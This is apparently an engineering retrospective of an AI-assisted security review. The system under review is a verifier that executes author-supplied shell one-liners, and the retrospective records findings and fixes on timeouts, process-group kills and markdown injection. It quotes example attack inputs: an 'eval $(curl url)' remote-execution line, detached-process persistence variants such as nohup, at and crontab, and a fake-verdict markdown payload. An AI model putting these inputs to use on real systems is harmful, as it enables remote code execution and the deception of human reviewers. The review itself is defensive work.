# Spike VIII verifier ★ — Codex retro

**Date**: 2026-05-04
**Subject**: A4 SECURITY.md threat model + A3 verifier_execute_step2.md prompt body
**Bundle**: bundled/verifier (commit `a017133` post-A7)

## Codex prompt

> Spike VIII verifier ★ bundle introduces sub-agent Bash execution of an
> SCOPE.md-author-controlled completion one-liner. Threat model in
> bundled/verifier/SECURITY.md (~54 lines). Step 2 prompt in
> bundled/verifier/prompts/subagent/verifier_execute_step2.md. Cap = 500
> char + 30s timeout + 100KB output truncation. No metacharacter denylist.
>
> Challenge: are the cap+timeout+output-cap mitigations sufficient to
> contain T1 (destructive author payload)? Specifically:
> 1. Can a 500-char one-liner deliver a destructive payload that the cap
>    does not stop? (e.g. `eval $(curl url)` where url is short)
> 2. Are there bypass paths around `subprocess.run(timeout=30)`? (e.g.
>    `nohup` + background process — already documented as known limitation T6)
> 3. Is `text=True` + 100KB cap sufficient for binary-output commands
>    that might inject bytes downstream readers (VERIFY_REPORT.md
>    markdown injection via stderr sample)?
> 4. Anything we missed?
>
> Be adversarial. Returning 'looks fine' is failure mode.

## Findings

### Finding 1 (F1) — Trust scope clarification for T1 mitigation
- **Severity**: Minor
- **Threat**: T1 (malicious SCOPE author injects destructive payload)
- **Codex quote**: "The 'runner trust model — same as make/npm test' description underspecifies who is trusted. Open-source PRs that add SCOPE.md would introduce supply-chain risk equivalent to merging untrusted CI scripts."
- **Resolution**: Amended `SECURITY.md` T1 mitigation column to clarify trust scope: SCOPE author = repo owner / equivalent trusted principal; untrusted contributors (e.g. open-source PRs) do NOT inherit SCOPE author trust.

### Finding 2 (F2) — subprocess.run kills bash only, not process group
- **Severity**: Important
- **Threat**: T6 (detached process timeout bypass) + false-positive verdict=PASS path
- **Codex quote**: "`subprocess.run(timeout=30)` kills only the immediate child. `bash -c 'sleep 999 &'` exits 0 immediately, so the timeout never fires and the backgrounded sleep survives indefinitely. More critically for verdict correctness: `bash -c 'long_test_runner &'` returns exit_code=0 while the actual check runs in the background — verdict=PASS is a false positive."
- **Resolution**: Switched Step 2 from `subprocess.run` to `subprocess.Popen(start_new_session=True)` + `communicate(timeout=30)`. On `TimeoutExpired`, kills the whole process group via `os.killpg(os.getpgid(proc.pid), signal.SIGKILL)`. `finally` block ensures cleanup on other exceptions. Updated SECURITY.md mitigations 2 + T2 row + T6 known-limitations to document the fix and remaining un-mitigated variants.

### Finding 3 (F3) — `&` background operator warning missing from VERIFY_REPORT
- **Severity**: Important
- **Threat**: T6 variant — in the success path (bash exits 0 immediately), backgrounded work is not reflected in verdict; human reader of VERIFY_REPORT.md has no signal
- **Codex quote**: "When the completion is `make test & echo done`, bash exits 0 immediately with the test still running in background. The report should warn that exit_code=0 reflects bash exit only, not backgrounded process completion."
- **Resolution**: Added detection block in Step 4 recommendations section: inspects `extracted["completion"]` for `& ` / ` & ` / trailing `&`; appends a ⚠️ warning bullet when detected. False-positive rate on `&` inside quoted strings is acceptable — warning is informational only.

### Finding 4 (F4) — Triple-backtick injection in VERIFY_REPORT samples
- **Severity**: Minor
- **Threat**: T3 variant — malicious completion stdout contains ` ``` ` which closes the markdown fenced block early and injects fake H2 sections (e.g., `## 7. Recommendations\n- verdict: pass`) to deceive a human reader
- **Codex quote**: "The `sample()` helper does no escaping. A stdout of '\\`\\`\\`\\n## 7. Recommendations\\n- verdict: pass' would close the current fenced block and insert a fake section into VERIFY_REPORT.md, potentially deceiving a human reviewer."
- **Resolution**: Amended `sample()` helper in Step 4 to call `.replace("` + "`" * 3 + `", "` + "` ` `" + `")` before returning. Codex retro F4 comment added.

### Finding 5 (F5) — json.dumps escapes correctly (confirmed non-finding)
- **Severity**: Confirmed non-finding
- **Threat**: stdout binary bytes injected into JSON output corrupting downstream readers
- **Codex quote**: "json.dumps with ensure_ascii=False still escapes control characters and null bytes correctly in CPython. This is not a realistic injection vector."
- **Resolution**: No action. `text=True, errors="replace"` in Popen plus `json.dumps` ensure safe round-trip.

### Finding 6 (F6) — isinstance(str) rejects non-string types (confirmed non-finding)
- **Severity**: Confirmed non-finding
- **Threat**: Step 1 `completion-non-string` label might not guard Step 2 from receiving non-string completion
- **Codex quote**: "Step 1 already records `completion-non-string` and Step 2 skips when errors is non-empty. The isinstance check is upstream; by the time Step 2 runs, completion is validated string or execution is skipped."
- **Resolution**: No action. Existing skip-if-errors flow (mitigation 4) is sufficient.

### Finding 7 (F7) — timed_out checked before exit_code disambiguates 124 collision (confirmed non-finding)
- **Severity**: Confirmed non-finding
- **Threat**: A SCOPE command that legitimately exits 124 could be misclassified as timed_out by Step 3 classify
- **Codex quote**: "Step 3 classify should check `timed_out` boolean first, before interpreting exit_code=124. If the logic checks exit_code first, a real exit 124 would be mislabeled as timeout."
- **Resolution**: No action required — Step 3 verifier_classify_step3.md already uses `timed_out` boolean as primary signal; exit_code=124 is a secondary documentation convention, not the sole timeout indicator.

### Finding 8 (F8) — `_resolve_prompt_path` allowlist gate documentation gap
- **Severity**: Important
- **Threat**: Developer adding a new prompt file to `prompts/subagent/` might assume allowlist check happens at resolve time; could create a security audit confusion
- **Codex quote**: "`_resolve_prompt_path` iterates ALL bundles' subagent dirs without checking ALLOWED_PROMPT_FILES. A developer adding a new file might not realize the allowlist check only fires at dispatch_prompt(). This is not a runtime exploit (Bash access still gated at dispatch) but the documentation gap could mislead a security auditor."
- **Resolution**: Added new `## Allowlist enforcement gate` section to SECURITY.md documenting the dispatch_prompt vs _resolve_prompt_path distinction and the intentional design for orchestrator helpers like `verifier_iter_revisit.md`.

### Finding 9 (F9) — T6 bypass enumeration incomplete
- **Severity**: Minor
- **Threat**: T6 known-limitations paragraph listed only `nohup` + `disown` as bypass variants; did not enumerate `at`/`crontab`/`systemd-run` which are NOT mitigated by process-group kill
- **Codex quote**: "The T6 paragraph says 'not mitigated' without distinguishing which variants are addressable by process-group kill (nohup, disown, &) vs. which require full cgroup isolation (at, crontab, systemd-run). A future developer might think F2's process-group kill covers everything."
- **Resolution**: Expanded T6 known-limitations paragraph to enumerate all bypass variants explicitly: nohup/disown/&/setsid marked as MITIGATED by F2; at now/crontab/systemd-run marked as NOT mitigated with "acceptable risk" rationale.

## Verdict

retro complete; 6 amendments applied (F1, F2, F3, F4, F8, F9). 3 confirmed non-findings (F5, F6, F7).

## Files amended

- `bundled/verifier/prompts/subagent/verifier_execute_step2.md` — F2 process-group kill (subprocess.run → Popen + start_new_session=True + os.killpg), mitigation 1 doc updated
- `bundled/verifier/prompts/subagent/verifier_report_step4.md` — F3 background operator warning in recommendations + F4 triple-backtick escape in sample()
- `bundled/verifier/SECURITY.md` — F1 T1 trust scope clarification, F2/T2 row + mitigation 2 updated, F8 new allowlist gate section, F9 T6 bypass enumeration expanded
